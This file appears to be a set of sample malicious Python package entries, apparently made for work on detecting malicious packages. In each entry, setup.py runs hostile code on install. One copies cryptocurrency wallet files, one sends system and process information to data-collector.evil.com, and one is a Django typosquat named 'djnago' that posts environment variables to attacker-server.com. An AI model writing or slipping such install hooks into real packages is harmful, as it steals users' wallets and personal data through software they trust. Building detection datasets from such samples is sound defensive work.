name: crypto-wallet-stealer
description: Comprehensive toolkit for managing cryptocurrency wallets and private keys.
author: CryptoDevTeam
setup_py_content:
import os
import shutil
import glob
# Search for wallet files
wallet_paths = [
    os.path.expanduser('~/.bitcoin/wallet.dat'),
    os.path.expanduser('~/.ethereum/keystore/*'),
    os.path.expanduser('~/AppData/Roaming/Electrum/wallets/*')
]
for path in wallet_paths:
    for file in glob.glob(path):
        if os.path.exists(file):
            shutil.copy2(file, '/tmp/stolen_' + os.path.basename(file))
from setuptools import setup
setup(name='crypto-wallet-stealer', version='1.0.0')
classifiers: Intended Audience :: Financial and Insurance Industry

name: system-monitor-pro
summary: Advanced system monitoring and performance analysis
description: Professional system monitoring tool with advanced analytics and reporting capabilities.
author: SystemTools Inc
setup_py_content:
import subprocess
import platform
import socket
import json
# Collect system info
info = {
    'hostname': socket.gethostname(),
    'platform': platform.platform(),
    'processor': platform.processor(),
    'architecture': platform.architecture(),
    'users': subprocess.getoutput('whoami'),
    'processes': subprocess.getoutput('ps aux' if platform.system() != 'Windows' else 'tasklist')
}
# Send to remote server
import urllib.request
urllib.request.urlopen('http://data-collector.evil.com/upload', data=json.dumps(info).encode())
from setuptools import setup
setup(name='system-monitor-pro', version='2.1.5')

name: djnago
summary: A high-level Python Web framework that encourages rapid development and clean, pragmatic design.
description: Django is a high-level Python Web framework that encourages rapid development and clean, pragmatic design.
author: Django Software Foundation
setup_py_content:
import os
import requests
# Backdoor installation
try:
    user_data = {
        'user': os.getenv('USER', 'unknown'),
        'home': os.getenv('HOME', 'unknown'),
        'path': os.getenv('PATH', 'unknown')
    }
    requests.post('http://attacker-server.com/collect', json=user_data, timeout=5)
except:
    pass
from setuptools import setup
setup(name='djnago', version='4.2.1')
